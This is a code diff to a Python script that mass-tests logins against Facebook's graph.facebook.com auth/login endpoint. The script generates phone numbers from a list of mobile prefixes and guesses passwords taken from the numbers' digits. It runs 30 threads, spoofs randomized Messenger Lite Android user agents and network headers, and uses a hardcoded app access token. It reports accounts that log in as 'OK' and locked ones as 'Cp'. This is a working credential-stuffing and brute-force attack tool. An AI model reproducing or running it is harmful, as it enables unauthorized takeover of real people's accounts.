@@ -101,7 +101,58 @@ def c(e,p):
             break
     sub()
     n+=1
-#c(e,p)
+
+#API- method
+
+
+def generate_ugent():
+    versi_android = random.randint(4,12)
+    versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    versi_app = random.randint(410000000,499999999)
+    ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; 21061119DG Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/xiaomi;FBBD/xiaomi;FBDV/21061119DG;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
+    return ugent
+nn=0
+def n(user,pw):
+    global nn
+    print(f"{nn} [{user} {pw}]",end="\r")
+    ses=r.Session()
+    params = {
+        "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+        "sdk_version": {random.randint(1,26)}, 
+        "email": user,
+        "locale": "ja_JP",
+        "password": pw,
+        "sdk": "android",
+        "generate_session_cookies": "1",
+        "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+    }
+    
+    headers = {
+        "Host": "graph.facebook.com",
+        "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+        "x-fb-sim-hni": str(random.randint(20000, 40000)),
+        "x-fb-net-hni": str(random.randint(20000, 40000)),
+        "x-fb-connection-quality": "EXCELLENT",
+        "user-agent": generate_ugent(),
+        "content-type": "application/x-www-form-urlencoded",
+        "x-fb-http-engine": "Liger"
+        
+    }
+    post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
+    
+    if "session_key" in post.text:
+        print(f"OK -{user}-{pw}")
+    elif "User must verify their account" in post.text:
+        print(f"Cp -{user}-{pw}")
+    nn+=1
+
+
+
+
+
+
+
+
 os.system("clear")
 codes=[300, 301, 302, 303, 304, 305, 306, 307, 308, 309,310, 311, 312, 313, 314, 315, 316, 317, 318,320, 321, 322, 323, 324, 325, 326,330, 331, 332, 333, 334, 335, 336, 337,340, 341, 342, 343, 344, 345, 346, 347, 348, 349 ,355,364]
 code=input("Code(0305,0303,0345):")
@@ -117,7 +168,7 @@ print(nums)
             
 with tdp(max_workers=30) as t:
     for i in nums:
-        t.submit(c,i,i[4:])
+        t.submit(n,i,i[4:])
 
 
 
